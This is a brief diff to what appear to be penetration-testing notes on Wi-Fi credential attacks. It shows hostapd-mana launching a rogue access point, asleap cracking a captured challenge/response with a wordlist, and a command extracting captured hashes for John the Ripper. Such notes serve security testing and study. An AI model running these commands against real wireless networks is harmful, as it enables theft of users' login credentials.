@@ -98,4 +98,4 @@ $sudo hostapd-mana /etc/hostapd-mana/mana.conf -B
 asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
 
 ** Hashes **
-grep JTR | cut -f2 >> [output.txt]
+cat hostapd.creds | grep JTR | cut -f2 >> output.txt
